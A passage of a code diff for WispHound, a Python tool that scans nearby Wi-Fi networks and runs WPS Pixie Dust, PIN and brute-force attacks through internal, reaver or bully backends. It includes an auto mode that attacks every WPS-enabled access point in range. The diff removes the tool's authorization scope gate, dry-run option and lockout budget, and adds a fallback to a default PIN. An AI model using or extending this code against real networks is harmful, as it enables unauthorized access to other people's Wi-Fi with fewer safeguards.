+                print(UI.msg('err', f'Error: {line}'))
+                return False
+            line = line.strip('\t')
+            for regexp, handler in matchers.items():
+                m = re.match(regexp, line)
+                if m:
+                    handler(line, m, networks)
+
+        # [2.1.2] No WPS filter — every AP is listed.
 
         if self.min_rssi is not None:
-            networks = [n for n in networks if n.get('Level', -100) >= self.min_rssi]
+            networks = [n for n in networks
+                        if n.get('Level', -100) >= self.min_rssi]
         if self.band:
-            rng = {'2.4': (2400, 2500), '5': (5000, 5900), '6': (5900, 7200)}.get(self.band)
-            if rng: networks = [n for n in networks if rng[0] <= n.get('Frequency', 0) <= rng[1]]
-        if not networks: return False
+            if self.band == '2.4':
+                networks = [n for n in networks
+                            if 2400 <= n.get('Frequency', 0) <= 2500]
+            elif self.band == '5':
+                networks = [n for n in networks
+                            if 5000 <= n.get('Frequency', 0) <= 5900]
+            elif self.band == '6':
+                networks = [n for n in networks
+                            if 5900 <= n.get('Frequency', 0) <= 7200]
+        if not networks:
+            return False
 
         for net in networks:
             vuln, chipset = self._classify_pixie_vuln(net)
@@ -2032,222 +2455,246 @@ class WiFiScanner:
             net['Chipset'] = chipset
             if self.db:
                 net['Vendor'] = self.db.vendor_for(net['BSSID'])
-                try: self.db.upsert(net)
-                except Exception: pass
+                self.db.upsert(net)
 
-        networks.sort(key=lambda x: (not x.get('WPS', False),
-                                     not x.get('Pixie vulnerable', False),
-                                     x.get('WPS locked', False),
-                                     -x.get('Level', -100)))
+        # WPS first, then Pixie-vulnerable, then unlocked, then signal.
+        # .get() so a malformed beacon cannot raise KeyError.
+        networks.sort(key=lambda x: (
+            not x.get('WPS', False),
+            not x.get('Pixie vulnerable', False),
+            x.get('WPS locked', False),
+            -x.get('Level', -100),
+        ))
         network_list = {(i + 1): n for i, n in enumerate(networks)}
 
-        def trunc(s, length, postfix='…'):
-            if wcwidth.wcswidth(s) <= length: return s
+        def truncateStr(s, length, postfix='…'):
+            width = wcwidth.wcswidth(s)
+            if width <= length:
+                return s + ' ' * (length - width)
+            postfix_w = wcwidth.wcswidth(postfix)
             out, cur = [], 0
-            pw = wcwidth.wcswidth(postfix)
             for c in s:
                 cw = wcwidth.wcswidth(c)
-                if cur + cw > length - pw: break
-                out.append(c); cur += cw
-            return ''.join(out) + postfix
+                if cur + cw > length - postfix_w:
+                    break
+                out.append(c)
+                cur += cw
+            res = ''.join(out)
+            if len(out) < len(s):
+                res += postfix
+            rw = wcwidth.wcswidth(res)
+            return res + ' ' * max(0, length - rw)
 
-        print(UI.muted('Legend: ') + '  '.join([
-            UI.ok('● vulnerable'), UI.err('● WPS locked'),
-            UI.warn('● already stored'), UI.info('● Pixie-vulnerable'),
-            UI.muted('● no WPS')]), file=sys.stderr)
+        # Legend
+        legend = '  '.join([
+            UI.ok('● vulnerable'),
+            UI.err('● WPS locked'),
+            UI.warn('● already stored'),
+            UI.info('● Pixie-vulnerable'),
+            UI.muted('● no WPS'),
+        ])
+        print(UI.muted('Legend: ') + legend)
+        print()
+
+        # Build table rows
         rows = []
         items = list(network_list.items())
-        if self.reverse_scan: items = items[::-1]
+        if self.reverse_scan:
+            items = items[::-1]
         for n, net in items:
             model = f"{net['Model']} {net['Model number']}".strip()
-            essid = trunc(net.get('ESSID', 'HIDDEN'), 24)
-            dev = trunc(net['Device name'], 22)
-            wps = UI.ok('yes') if net.get('WPS') else UI.muted('no')
-            row = [str(n), net['BSSID'], essid, net['Security type'],
-                   str(net['Level']), str(net.get('Channel', '')), wps,
-                   dev, model]
+            essid = truncateStr(net.get('ESSID', 'HIDDEN'), 24)
+            dev = truncateStr(net['Device name'], 22)
+            ch = str(net.get('Channel', ''))
+            wps_flag = UI.ok('yes') if net.get('WPS') else UI.muted('no')
+            level = str(net['Level'])
+            # Determine row colorisation
             if not net.get('WPS'):
-                row = [UI.muted(c) for c in row]
+                row = [UI.muted(str(n)), UI.muted(net['BSSID']),
+                       UI.muted(essid), UI.muted(net['Security type']),
+                       UI.muted(level), UI.muted(ch), wps_flag,
+                       UI.muted(dev), UI.muted(model)]
             elif net.get('Pixie vulnerable'):
-                row = [UI.info(c) for c in row]
+                row = [UI.info(f'{n})'), UI.info(net['BSSID']),
+                       UI.info(essid), UI.info(net['Security type']),
+                       UI.info(level), UI.info(ch), wps_flag,
+                       UI.info(dev), UI.info(model)]
             elif (net['BSSID'], net.get('ESSID', 'HIDDEN')) in self.stored:
-                row = [UI.warn(c) for c in row]
-            elif net.get('WPS locked'):
-                row = [UI.err(c) for c in row]
+                row = [UI.warn(f'{n})'), UI.warn(net['BSSID']),
+                       UI.warn(essid), UI.warn(net['Security type']),
+                       UI.warn(level), UI.warn(ch), wps_flag,
+                       UI.warn(dev), UI.warn(model)]
+            elif net['WPS locked']:
+                row = [UI.err(f'{n})'), UI.err(net['BSSID']),
+                       UI.err(essid), UI.err(net['Security type']),
+                       UI.err(level), UI.err(ch), wps_flag,
+                       UI.err(dev), UI.err(model)]
+            elif self.vuln_list and model in self.vuln_list:
+                row = [UI.ok(f'{n})'), UI.ok(net['BSSID']),
+                       UI.ok(essid), UI.ok(net['Security type']),
+                       UI.ok(level), UI.ok(ch), wps_flag,
+                       UI.ok(dev), UI.ok(model)]
+            else:
+                row = [f'{n})', net['BSSID'], essid,
+                       net['Security type'], level, ch, wps_flag, dev, model]
             rows.append(row)
-        print(UI.table(['#', 'BSSID', 'ESSID', 'Security', 'PWR', 'Ch',
-                        'WPS', 'WSC device name', 'WSC model'], rows,
-                       aligns=['r', 'l', 'l', 'l', 'r', 'r', 'c', 'l', 'l'],
-                       max_widths=[4, 17, 24, 12, 5, 4, 5, 22, 30],
-                       title=f'Networks ({len(rows)} APs)'), file=sys.stderr)
+
+        print(UI.table(
+            ['#', 'BSSID', 'ESSID', 'Security', 'PWR', 'Ch', 'WPS',
+             'WSC device name', 'WSC model'],
+            rows,
+            aligns=['r', 'l', 'l', 'l', 'r', 'r', 'c', 'l', 'l'],
+            max_widths=[4, 17, 24, 10, 5, 4, 5, 22, 30],
+            title=f'Networks list — all bands ({len(rows)} APs)'))
+
         return network_list
 
     def prompt_network(self):
         with UI.spinner('Scanning for networks'):
             networks = self.iw_scanner()
         if not networks:
-            print(UI.msg('err', 'No networks found'), file=sys.stderr); return None
+            print(UI.msg('err', 'No networks found.'))
+            return None
         while True:
             try:
-                c = input(UI.info('Select target (Enter=refresh): ')).strip()
-                if c.lower() in ('r', '0', ''): return self.prompt_network()
-                i = int(c)
-                if i in networks:
-                    t = networks[i]
-                    if not t.get('WPS'):
-                        print(UI.msg('warn', f"{t['BSSID']} has no WPS"), file=sys.stderr)
-                    self.selected_vuln = t.get('Pixie vulnerable', False)
-                    self.selected_chipset = t.get('Chipset', '')
-                    self.selected_channel = t.get('Channel', 0)
-                    self.selected_wps = bool(t.get('WPS'))
-                    return t['BSSID']
-            except (ValueError, EOFError, KeyboardInterrupt):
-                print(UI.msg('err', 'Invalid'), file=sys.stderr)
-
-
-# ---------------------------------------------------------------------------
-# Scope gate
-# ---------------------------------------------------------------------------
-def load_authorized(path):
-    if not path: return None
-    allowed = set()
-    try:
-        with open(path, 'r', encoding='utf-8') as f:
-            for line in f:
-                line = line.strip()
-                if not line or line.startswith('#'): continue
-                allowed.add(line.replace('-', ':').upper())
-    except OSError as e:
-        print(UI.msg('err', f'Cannot read --authorized {path}: {e}'), file=sys.stderr)
-        return set()
-    return allowed
-
-
-def check_authorized(bssid, allowed, i_understand):
-    if allowed is None or i_understand: return True
-    if bssid.upper() in allowed: return True
-    print(UI.msg('err', f'{bssid} not in --authorized scope; add --i-understand to override'),
-          file=sys.stderr)
-    return False
+                choice = input(UI.info('Select target (press Enter to refresh): '))
+                if choice.lower() in ('r', '0', ''):
+                    return self.prompt_network()
+                idx = int(choice)
+                if idx in networks:
+                    target = networks[idx]
+                    if not target.get('WPS'):
+                        print(UI.msg('warn', f"{target['BSSID']} has no WPS IE — "
+                                               f"it will be shown but cannot be attacked."))
+                    self.selected_vuln = target.get('Pixie vulnerable', False)
+                    self.selected_chipset = target.get('Chipset', '')
+                    self.selected_channel = target.get('Channel', 0)
+                    self.selected_wps = bool(target.get('WPS'))
+                    return target['BSSID']
+                raise IndexError
+            except (ValueError, IndexError):
+                print(UI.msg('err', 'Invalid number'))
 
 
 # ---------------------------------------------------------------------------
 # Auto pipeline
 # ---------------------------------------------------------------------------
 def auto_exploit(interface, args, db):
-    scanner = WiFiScanner(interface, [], reverse_scan=False, db=db,
-                          min_rssi=args.min_rssi, band=args.band)
+    scanner = WiFiScanner(
+        interface, [], reverse_scan=False, db=db,
+        min_rssi=getattr(args, 'min_rssi', None),
+        band=getattr(args, 'band', None))
     with UI.spinner('Scanning for networks'):
         networks = scanner.iw_scanner()
     if not networks:
-        print(UI.msg('err', 'No networks'), file=sys.stderr); return
+        print(UI.msg('err', 'No networks.'))
+        return
     order = sorted(networks.values(),
                    key=lambda n: (not n.get('WPS', False),
                                   not n.get('Pixie vulnerable', False),
                                   n.get('WPS locked', False),
                                   -n.get('Level', -100)))
-    allowed = load_authorized(args.authorized)
+
+    backend = getattr(args, 'backend', BACKEND_INTERNAL)
+    # [FIX] Use the same writable reports dir the internal backend uses.
     reports_dir = pick_reports_dir()
-    skipped = collections.Counter()
-    attempted = 0
 
-    def _skip(net, reason):
-        skipped[reason] += 1
-        print(UI.msg('info', f"Skipping {net['BSSID']} ({reason})"), file=sys.stderr)
+    if backend in (BACKEND_REAVER, BACKEND_BULLY):
+        attacker_cls = ReaverAttacker if backend == BACKEND_REAVER else BullyAttacker
+        if not attacker_cls.is_available():
+            print(UI.msg('err', f'{backend} is not installed or not in PATH'))
+            return
 
-    if args.backend in (BACKEND_REAVER, BACKEND_BULLY):
-        cls = ReaverAttacker if args.backend == BACKEND_REAVER else BullyAttacker
-        if not cls.is_available():
-            print(UI.msg('err', f'{args.backend} not installed'), file=sys.stderr); return
+        print(UI.msg('info', f'Switching {interface} to monitor mode…'))
+        mon_iface = setup_monitor_mode(interface)
+        print(UI.msg('ok', f'Monitor interface: {UI.hi(mon_iface)}'))
+
         try:
-            mon = setup_monitor_mode(interface)
-        except RuntimeError as e:
-            print(UI.msg('err', str(e)), file=sys.stderr); return
-        print(UI.msg('ok', f'Monitor: {UI.hi(mon)}'), file=sys.stderr)
-        try:
-            attacker = cls(mon, verbose=args.verbose, timeout=args.attack_timeout,
-                           delay=args.delay, json_mode=args.json, dry_run=args.dry_run)
+            attacker = attacker_cls(
+                mon_iface, verbose=args.verbose,
+                timeout=args.timeout, delay=args.delay,
+                json_mode=args.json)
+
             for net in order:
-                if not net.get('WPS'): _skip(net, 'no WPS'); continue
-                if net['WPS locked']: _skip(net, 'WPS locked'); continue
-                if db.is_locked(net['BSSID']): _skip(net, 'lockout backoff'); continue
-                if args.pixie_only and not net['Pixie vulnerable']: _skip(net, 'not Pixie-vuln'); continue
-                if not check_authorized(net['BSSID'], allowed, args.i_understand):
-                    _skip(net, 'out of scope'); continue
-                attempted += 1
-                print(UI.section(f"Attacking {net['BSSID']} ({net.get('ESSID', 'HIDDEN')}) [{args.backend}]"),
-                      file=sys.stderr)
+                if not net.get('WPS'):
+                    print(UI.msg('info', f"Skipping {net['BSSID']} (no WPS)"))
+                    continue
+                if net['WPS locked']:
+                    print(UI.msg('info', f"Skipping {net['BSSID']} (WPS locked)"))
+                    continue
+                if args.pixie_only and not net['Pixie vulnerable']:
+                    continue
+                print(UI.section(f"Attacking {net['BSSID']} "
+                                 f"({net.get('ESSID', 'HIDDEN')}) [{backend}]"))
                 ch = net.get('Channel', 0)
                 try:
                     if net['Pixie vulnerable']:
-                        res = attacker.pixie_dust(net['BSSID'], channel=ch)
-                        if not res.success and not args.dry_run:
-                            pin = WPSpin().getLikely(net['BSSID'])
-                            if pin:
-                                res = attacker.single_pin(net['BSSID'], pin, channel=ch)
+                        result = attacker.pixie_dust(net['BSSID'], channel=ch)
+                        if not result.success:
+                            print(UI.msg('info', 'Pixie Dust failed — trying PIN attack'))
+                            likely_pin = WPSpin().getLikely(net['BSSID']) or '12345670'
+                            result = attacker.single_pin(
+                                net['BSSID'], likely_pin, channel=ch)
                     else:
-                        res = attacker.bruteforce(net['BSSID'], channel=ch)
-                    _handle_backend_result(res, net['BSSID'], db=db,
-                                           save_result=args.write,
-                                           reports_dir=reports_dir,
-                                           json_mode=args.json)
+                        result = attacker.bruteforce(
+                            net['BSSID'], channel=ch)
+                    _handle_backend_result(
+                        result, net['BSSID'], db=db,
+                        save_result=args.write, reports_dir=reports_dir,
+                        json_mode=args.json)
                 except KeyboardInterrupt:
-                    print('\n' + UI.msg('warn', 'Interrupted.'), file=sys.stderr)
+                    print('\n' + UI.msg('warn', 'Interrupted.'))
                     break
         finally:
-            print(UI.msg('info', f'Restoring {interface}…'), file=sys.stderr)
-            teardown_monitor_mode(mon, interface)
-        print(UI.msg('info', f'attempted={attempted} skipped={dict(skipped)}'), file=sys.stderr)
+            print(UI.msg('info', f'Restoring {interface} to managed mode…'))
+            teardown_monitor_mode(mon_iface, interface)
         return
 
     for net in order:
-        if not net.get('WPS'): _skip(net, 'no WPS'); continue
-        if net['WPS locked']: _skip(net, 'WPS locked'); continue
-        if db.is_locked(net['BSSID']): _skip(net, 'lockout backoff'); continue
-        if args.pixie_only and not net['Pixie vulnerable']: _skip(net, 'not Pixie-vuln'); continue
-        if not check_authorized(net['BSSID'], allowed, args.i_understand):
-            _skip(net, 'out of scope'); continue
-        attempted += 1
-        print(UI.section(f"Attacking {net['BSSID']} ({net.get('ESSID', 'HIDDEN')})"), file=sys.stderr)
-        try:
-            comp = Companion(interface, save_result=args.write,
-                             print_debug=args.verbose, db=db,
-                             json_mode=args.json, trace_log=args.trace_log,
-                             pixiewps_timeout=args.pixie_timeout,
-                             cool_down=args.cool, auto_mode=True,
-                             save_capture=args.save_capture, dry_run=args.dry_run,
-                             lockout_budget=args.lockout_budget)
-        except Exception as e:
-            print(UI.msg('err', f'Cannot init Companion for {net["BSSID"]}: {e}'),
-                  file=sys.stderr)
+        if not net.get('WPS'):
+            print(UI.msg('info', f"Skipping {net['BSSID']} (no WPS)"))
             continue
+        if net['WPS locked']:
+            print(UI.msg('info', f"Skipping {net['BSSID']} (WPS locked)"))
+            continue
+        if args.pixie_only and not net['Pixie vulnerable']:
+            continue
+        print(UI.section(f"Attacking {net['BSSID']} "
+                         f"({net.get('ESSID', 'HIDDEN')})"))
+        comp = Companion(interface, save_result=args.write,
+                         print_debug=args.verbose, db=db,
+                         json_mode=args.json,
+                         trace_log=args.trace_log,
+                         pixiewps_timeout=args.timeout,
+                         cool_down=args.cool,
+                         auto_mode=True)
         comp.target_is_pixie_vuln = net['Pixie vulnerable']
         comp.target_chipset = net.get('Chipset', '')
         try:
-            comp.single_connection(net['BSSID'], pixiemode=net['Pixie vulnerable'],
-                                   showpixiecmd=args.show_pixie_cmd,
-                                   pixieforce=args.pixie_force,
-                                   store_pin_on_fail=net['Pixie vulnerable'])
+            if net['Pixie vulnerable']:
+                comp.single_connection(net['BSSID'], pixiemode=True,
+                                       showpixiecmd=args.show_pixie_cmd,
+                                       pixieforce=args.pixie_force,
+                                       store_pin_on_fail=True)
+            else:
+                comp.single_connection(net['BSSID'],
+                                       showpixiecmd=args.show_pixie_cmd,
+                                       pixieforce=args.pixie_force)
         except KeyboardInterrupt:
-            print('\n' + UI.msg('warn', 'Interrupted.'), file=sys.stderr); break
-        except Exception as e:
-            print(UI.msg('err', f'{net["BSSID"]} failed: {e}'), file=sys.stderr)
+            print('\n' + UI.msg('warn', 'Interrupted.'))
+            break
         finally:
             comp.cleanup()
-    print(UI.msg('info', f'attempted={attempted} skipped={dict(skipped)}'), file=sys.stderr)
 
 
 # ---------------------------------------------------------------------------
-# Helpers
+# Utility
 # ---------------------------------------------------------------------------
 def ifaceUp(iface, down=False):
-    try:
-        rc, _ = run_proc(['ip', 'link', 'set', iface, 'down' if down else 'up'],
-                         timeout=10, stdout=subprocess.DEVNULL,
-                         stderr=subprocess.DEVNULL)
-        return rc == 0
-    except (FileNotFoundError, subprocess.TimeoutExpired):
-        return False
+    action = 'down' if down else 'up'
+    return subprocess.run(['ip', 'link', 'set', iface, action],
+                          stdout=subprocess.DEVNULL,
+                          stderr=subprocess.DEVNULL).returncode == 0
 
 
 def die(msg):
@@ -2258,167 +2705,169 @@ def die(msg):
 # ---------------------------------------------------------------------------
 # Main
 # ---------------------------------------------------------------------------
-def build_parser():
-    p = argparse.ArgumentParser(
-        description=f'WispHound {VERSION} — WPS recon & Pixie Dust auditor',
+if __name__ == '__main__':
+    # Print banner first
+    print(UI.banner())
+
+    parser = argparse.ArgumentParser(
+        description=f'WispHound {VERSION} — WPS reconnaissance and '
+                    'Pixie Dust prioritization',
         epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K')
-    p.add_argument('-V', '--version', action='version', version=f'%(prog)s {VERSION}')
-    p.add_argument('-i', '--interface', required=True)
-    p.add_argument('-b', '--bssid')
-    p.add_argument('-p', '--pin')
-    p.add_argument('-c', '--channel', type=int, default=None)
-    p.add_argument('-e', '--backend', choices=list(BACKENDS), default=BACKEND_INTERNAL)
-    p.add_argument('-K', '--pixie-dust', action='store_true')
-    p.add_argument('-F', '--pixie-force', action='store_true')
-    p.add_argument('-X', '--show-pixie-cmd', action='store_true')
-    p.add_argument('-B', '--bruteforce', action='store_true')
-    p.add_argument('--pbc', '--push-button-connect', action='store_true')
-    p.add_argument('-d', '--delay', type=float)
-    p.add_argument('-w', '--write', action='store_true')
-    p.add_argument('--iface-down', action='store_true')
-    p.add_argument('--vuln-list', type=str,
-                   default=os.path.join(os.path.dirname(os.path.realpath(__file__)), 'vulnwsc.txt'))
-    p.add_argument('-l', '--loop', action='store_true')
-    p.add_argument('-r', '--reverse-scan', action='store_true')
-    p.add_argument('--mtk-wifi', action='store_true')
-    p.add_argument('-v', '--verbose', action='store_true')
-    p.add_argument('-A', '--auto', action='store_true')
-    p.add_argument('--pixie-only', action='store_true')
-    p.add_argument('-J', '--json', action='store_true')
-    p.add_argument('--db', type=str, default=os.path.expanduser('~/.WispHound/targets.db'))
-    p.add_argument('--trace-log', type=str, default=None)
-    p.add_argument('--oui', type=str, default=None)
-    p.add_argument('--timeout', type=int, default=None,
-                   help='alias for --pixie-timeout (kept for compatibility)')
-    p.add_argument('--pixie-timeout', type=int, default=120)
-    p.add_argument('--attack-timeout', type=int, default=1200)
-    p.add_argument('--cool', type=int, default=60)
-    p.add_argument('--no-lockout-check', action='store_true')
-    p.add_argument('--min-rssi', type=int, default=None)
-    p.add_argument('--band', choices=['2.4', '5', '6'], default=None)
-    p.add_argument('--resume', action='store_true')
-    # new power flags
-    p.add_argument('--save-capture', action='store_true',
-                   help='Persist M1-M7 transcript per BSSID to ~/.WispHound/captures/')
-    p.add_argument('--offline', type=str, default=None,
-                   help='Replay pixiewps from a saved capture JSON; no interface, no root')
-    p.add_argument('--dry-run', action='store_true',
-                   help='Print exact commands without executing')
-    p.add_argument('--authorized', type=str, default=None,
-                   help='File of BSSIDs you are authorised to test')
-    p.add_argument('--i-understand', action='store_true',
-                   help='Override --authorized scope gate')
-    p.add_argument('--lockout-budget', type=int, default=0,
-                   help='Refuse to attack a BSSID with N+ NACKs recently (default 0=off)')
-    p.add_argument('--unsafe', action='store_true')
-    p.add_argument('--tables-to-stdout', action='store_true',
-                   help='Legacy --json behaviour: keep tables on stdout')
-    return p
+    parser.add_argument('-V', '--version', action='version',
+                        version=f'%(prog)s {VERSION}')
+    parser.add_argument('-i', '--interface', required=True,
+                        help='Name of the interface to use')
+    parser.add_argument('-b', '--bssid', help='BSSID of the target AP')
+    parser.add_argument('-p', '--pin',
+                        help='Use the specified pin (arbitrary string or 4/8 digit pin)')
+    parser.add_argument('-c', '--channel', type=int, default=None,
+                        help='Channel of the target AP (useful for reaver/bully)')
+    parser.add_argument('-e', '--backend', choices=['internal', 'reaver', 'bully'],
+                        default='internal',
+                        help='Attack backend engine (default: internal)')
+    parser.add_argument('-K', '--pixie-dust', action='store_true',
+                        help='Run Pixie Dust attack')
+    parser.add_argument('-F', '--pixie-force', action='store_true',
+                        help='Run Pixiewps with --force (full range)')
+    parser.add_argument('-X', '--show-pixie-cmd', action='store_true',
+                        help='Always print Pixiewps command')
+    parser.add_argument('-B', '--bruteforce', action='store_true',
+                        help='Run online bruteforce attack')
+    parser.add_argument('--pbc', '--push-button-connect', action='store_true',
+                        help='Run WPS push button connection')
+    parser.add_argument('-d', '--delay', type=float,
+                        help='Delay between pin attempts')
+    parser.add_argument('-w', '--write', action='store_true',
+                        help='Write credentials to the file on success')
+    parser.add_argument('--iface-down', action='store_true',
+                        help='Down network interface when finished')
+    parser.add_argument('--vuln-list', type=str,
+                        default=os.path.dirname(os.path.realpath(__file__))
+                        + '/vulnwsc.txt',
+                        help='Custom file with vulnerable devices list')
+    parser.add_argument('-l', '--loop', action='store_true',
+                        help='Run in a loop')
+    parser.add_argument('-r', '--reverse-scan', action='store_true',
+                        help='Reverse order of networks in scan list')
+    parser.add_argument('--mtk-wifi', action='store_true',
+                        help='Activate MediaTek Wi-Fi driver on startup')
+    parser.add_argument('-v', '--verbose', action='store_true',
+                        help='Verbose output')
+    parser.add_argument('-A', '--auto', action='store_true',
+                        help='Scan → rank → attack each Pixie-vulnerable target')
+    parser.add_argument('--pixie-only', action='store_true',
+                        help='In --auto, only attack Pixie-vulnerable targets')
+    parser.add_argument('-J', '--json', action='store_true',
+                        help='Emit JSON lines for credentials / scan events')
+    parser.add_argument('--db', type=str,
+                        default=os.path.expanduser('~/.WispHound/targets.db'),
+                        help='SQLite target database')
+    parser.add_argument('--trace-log', type=str, default=None,
+                        help='Tee raw wpa_supplicant output to a file')
+    parser.add_argument('--oui', type=str, default=None,
+                        help='Additional OUI vendor file')
+    parser.add_argument('--timeout', type=int, default=120,
+                        help='pixiewps timeout in seconds (default 120)')
+    parser.add_argument('--cool', type=int, default=60,
+                        help='Cool-down seconds after 3 NACKs (default 60)')
+    parser.add_argument('--no-lockout-check', action='store_true',
+                        help='Skip lockout safety (not recommended)')
+    parser.add_argument('--min-rssi', type=int, default=None,
+                        help='Filter out APs weaker than this signal level in dBm')
+    parser.add_argument('--band', choices=['2.4', '5', '6'], default=None,
+                        help='Filter scan by Wi-Fi band (2.4, 5, or 6 GHz)')
+    parser.add_argument('--resume', action='store_true',
+                        help='Automatically resume saved brute-force session')
 
-
-def main(argv=None):
-    parser = build_parser()
-    args = parser.parse_args(argv)
-    # --timeout alias
-    if args.timeout is not None:
-        args.pixie_timeout = args.timeout
-    if args.no_lockout_check:
-        args.cool = 0; args.lockout_budget = 0
+    args = parser.parse_args()
 
     if sys.hexversion < 0x03060F0:
-        die('Requires Python 3.6+')
-
-    # JSON routing
-    json_stdout = sys.stdout if args.json else None
-    def jprint(*a, **kw):
-        kw.setdefault('file', json_stdout); print(*a, **kw)
-    # Replace global _emit style: route tables to stderr unless --tables-to-stdout
-    if args.json and not args.tables_to_stdout:
-        # human output -> stderr; JSON -> stdout (already handled in callers)
-        pass
-    else:
-        json_stdout = sys.stdout
-
-    print(UI.banner(), file=sys.stderr if args.json and not args.tables_to_stdout else sys.stdout)
-
-    # offline replay: no root, no interface
-    if args.offline:
-        db = TargetDB(args.db) if args.bssid or args.save_capture else None
-        ok = offline_replay(args.offline, full_range=args.pixie_force,
-                            timeout=args.pixie_timeout, db=db, bssid=args.bssid)
-        if db: db.close()
-        sys.exit(0 if ok else 1)
-
+        die('The program requires Python 3.6 and above')
     if os.getuid() != 0:
-        die('Run as root (or use --offline for capture replay)')
+        die('Run it as root')
 
     if args.mtk_wifi:
         dev = Path('/dev/wmtWifi')
         if not dev.is_char_device():
-            die('--mtk-wifi: /dev/wmtWifi missing or not a char device')
-        try:
-            dev.chmod(0o644); dev.write_text('1')
-        except OSError as e:
-            die(f'--mtk-wifi: {e}')
+            die('Unable to activate MediaTek Wi-Fi device (--mtk-wifi): '
+                '/dev/wmtWifi does not exist or is not a character device')
+        dev.chmod(0o644)
+        dev.write_text('1')
 
     if not ifaceUp(args.interface):
-        die(f'Cannot bring up {args.interface}')
+        die(f'Unable to up interface "{args.interface}"')
+
+    if args.no_lockout_check:
+        args.cool = 0
 
     db = TargetDB(args.db)
     if args.oui:
-        try: db.load_oui_file(args.oui)
+        try:
+            db.load_oui_file(args.oui)
         except FileNotFoundError:
-            print(UI.msg('err', f'OUI file not found: {args.oui}'), file=sys.stderr)
+            print(UI.msg('err', f'OUI file not found: {args.oui}'))
 
     try:
         if args.auto:
             auto_exploit(args.interface, args, db)
-            return 0
+            sys.exit(0)
 
         while True:
             try:
-                selected_vuln = False; selected_chipset = ''
-                selected_channel = args.channel; selected_wps = True
+                selected_vuln = False
+                selected_chipset = ''
+                selected_channel = args.channel
+                selected_wps = True
 
                 if args.pbc:
+                    # [FIX] Use the writable reports dir.
                     reports_dir = pick_reports_dir()
-                    if args.backend == BACKEND_INTERNAL:
-                        comp = Companion(args.interface, args.write,
-                                         print_debug=args.verbose, db=db,
-                                         json_mode=args.json, trace_log=args.trace_log,
-                                         pixiewps_timeout=args.pixie_timeout,
-                                         cool_down=args.cool, dry_run=args.dry_run,
-                                         lockout_budget=args.lockout_budget)
-                        try: comp.single_connection(bssid=args.bssid, pbc_mode=True)
-                        finally: comp.cleanup()
-                    elif args.backend == BACKEND_REAVER:
-                        if not ReaverAttacker.is_available():
-                            die('reaver not installed')
-                        try: mon = setup_monitor_mode(args.interface)
-                        except RuntimeError as e: die(str(e))
+                    if args.backend == 'internal':
+                        comp = Companion(
+                            args.interface, args.write,
+                            print_debug=args.verbose, db=db,
+                            json_mode=args.json, trace_log=args.trace_log,
+                            pixiewps_timeout=args.timeout, cool_down=args.cool)
                         try:
-                            atk = ReaverAttacker(mon, verbose=args.verbose,
-                                                 timeout=args.attack_timeout,
-                                                 delay=args.delay, dry_run=args.dry_run)
-                            res = atk.pbc(args.bssid, channel=args.channel)
-                            _handle_backend_result(res, args.bssid or 'PBC-AP', db=db,
-                                                   save_result=args.write,
-                                                   reports_dir=reports_dir,
-                                                   json_mode=args.json)
+                            comp.single_connection(bssid=args.bssid, pbc_mode=True)
                         finally:
-                            teardown_monitor_mode(mon, args.interface)
+                            comp.cleanup()
+                    elif args.backend == 'reaver':
+                        attacker_cls = ReaverAttacker
+                        if not attacker_cls.is_available():
+                            die('reaver is not installed or not in PATH')
+                        print(UI.msg('info', f'Switching {args.interface} to monitor mode…'))
+                        mon_iface = setup_monitor_mode(args.interface)
+                        try:
+                            attacker = attacker_cls(
+                                mon_iface, verbose=args.verbose,
+                                timeout=args.timeout, delay=args.delay,
+                                json_mode=args.json)
+                            res = attacker.pbc(args.bssid, channel=args.channel)
+                            _handle_backend_result(
+                                res, args.bssid or res.essid or 'PBC-AP', db=db,
+                                save_result=args.write, reports_dir=reports_dir,
+                                json_mode=args.json)
+                        finally:
+                            print(UI.msg('info', f'Restoring {args.interface} to managed mode…'))
+                            teardown_monitor_mode(mon_iface, args.interface)
                     else:
-                        die('Bully has no PBC mode; use internal or reaver')
+                        die('Bully does not support PBC mode. Use internal or reaver backend.')
                 else:
                     if not args.bssid:
-                        vuln_list = []
                         try:
-                            with open(args.vuln_list, 'r', encoding='utf-8') as f:
+                            with open(args.vuln_list, 'r',
+                                      encoding='utf-8') as f:
                                 vuln_list = f.read().splitlines()
-                        except FileNotFoundError: pass
-                        scanner = WiFiScanner(args.interface, vuln_list,
-                                              reverse_scan=args.reverse_scan, db=db,
-                                              min_rssi=args.min_rssi, band=args.band)
+                        except FileNotFoundError:
+                            vuln_list = []
+                        scanner = WiFiScanner(
+                            args.interface, vuln_list,
+                            reverse_scan=args.reverse_scan, db=db,
+                            min_rssi=args.min_rssi, band=args.band)
+                        if not args.loop:
+                            print(UI.msg('info', 'BSSID not specified (--bssid) — '
+                                                   'scanning for available networks'))
                         args.bssid = scanner.prompt_network()
                         selected_vuln = scanner.selected_vuln
                         selected_chipset = scanner.selected_chipset
@@ -2427,116 +2876,130 @@ def main(argv=None):
                             selected_channel = scanner.selected_channel
 
                     if not args.bssid:
-                        if not args.loop: break
+                        if not args.loop:
+                            break
                         continue
+
                     if not selected_wps:
-                        print(UI.msg('warn', f"{args.bssid} has no WPS"), file=sys.stderr)
-                        if not args.loop: break
-                        args.bssid = None; continue
+                        print(UI.msg('warn', f"{args.bssid} has no WPS — cannot attack with "
+                                               f"{args.backend} backend. Choose another target."))
+                        if not args.loop:
+                            break
+                        args.bssid = None
+                        continue
 
-                    allowed = load_authorized(args.authorized)
-                    if not check_authorized(args.bssid, allowed, args.i_understand):
-                        if not args.loop: break
-                        args.bssid = None; continue
-
+                    # [FIX] Use the writable reports dir.
                     reports_dir = pick_reports_dir()
+
                     if args.backend in (BACKEND_REAVER, BACKEND_BULLY):
-                        cls = ReaverAttacker if args.backend == BACKEND_REAVER else BullyAttacker
-                        if not cls.is_available(): die(f'{args.backend} not installed')
-                        try: mon = setup_monitor_mode(args.interface)
-                        except RuntimeError as e: die(str(e))
-                        print(UI.msg('ok', f'Monitor: {UI.hi(mon)}'), file=sys.stderr)
+                        attacker_cls = ReaverAttacker if args.backend == BACKEND_REAVER else BullyAttacker
+                        if not attacker_cls.is_available():
+                            die(f'{args.backend} is not installed or not in PATH')
+
+                        print(UI.msg('info', f'Switching {args.interface} to monitor mode…'))
+                        mon_iface = setup_monitor_mode(args.interface)
+                        print(UI.msg('ok', f'Monitor interface: {UI.hi(mon_iface)}'))
                         try:
-                            atk = cls(mon, verbose=args.verbose,
-                                      timeout=args.attack_timeout,
-                                      delay=args.delay, json_mode=args.json,
-                                      dry_run=args.dry_run)
+                            attacker = attacker_cls(
+                                mon_iface, verbose=args.verbose,
